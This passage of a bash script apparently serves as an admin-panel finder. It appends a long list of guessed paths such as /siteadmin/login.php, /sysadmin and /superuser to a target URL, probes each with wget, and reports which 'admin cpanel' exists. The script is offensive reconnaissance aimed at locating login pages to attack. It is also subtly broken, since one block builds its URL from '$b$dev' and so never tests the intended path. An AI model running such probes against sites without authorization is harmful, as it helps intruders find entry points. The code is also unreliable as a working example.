wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/rcjakar/admin/login.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/rcjakar/admin/login.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/rcjakar/admin/login.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/rcjakar/admin/login.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/rcLogin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/registration"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/relogin.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/relogin.htm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/relogin.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/relogin.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/root"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/roots"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/saff"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/secret"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/secret"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/secure"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/security"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/senha"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/senhas"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/ser.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/server"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/Server.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/Server.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/Server.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/server_admin_small"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/ServerAdministrator"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/sff"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/showlogin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/sign_in.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/sign_in.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/sign_in"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/signin.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/sign-in.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/signin.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/sign-in.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/signin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/sign-in"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/simpleLogin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/Sing"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/sistema"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/siteadmin.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/siteadmin.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/siteadmin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/siteadmin/index.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/siteadmin/index.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/siteadmin/index.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/siteadmin/index.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/siteadmin/index.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/siteadmin/login.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/siteadmin/login.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/siteadmin/login.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/siteadmin/login.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/siteadmin/login.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/siteadmin/login.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/smblogin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/sql-admin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/ss_vms_admin_sm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/sshadmin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/staradmin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/sub-login"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/super_indexasp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/super_indexphp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/super_loginasp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/super_loginphp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/super1"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/super1asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/super1php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/Super-Admin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/superasp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/superman"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/supermanagerasp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/supermanagerphp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/supermanasp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/supermanphp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/superphp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/superuser.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/superuser.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/superuser"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/superuserasp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/superuserphp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/supervise"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/supervise/Loginasp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/supervise/Loginphp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/supervisor"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/support_login"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/sysadm.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/sysadm.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/sysadm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/sysadmin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/sys-admin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/sysadmin.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/sysadmin.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/sysadmin.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/SysAdmin2"
c=$b$dev
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/sysadmins"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/system_administration"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/system-administration"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/typo3"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/ur-admin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/ur-admin.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/ur-admin.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/ur-admin.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/usager"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/user.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/user.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/user.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/user.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/user.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/user.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/user.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
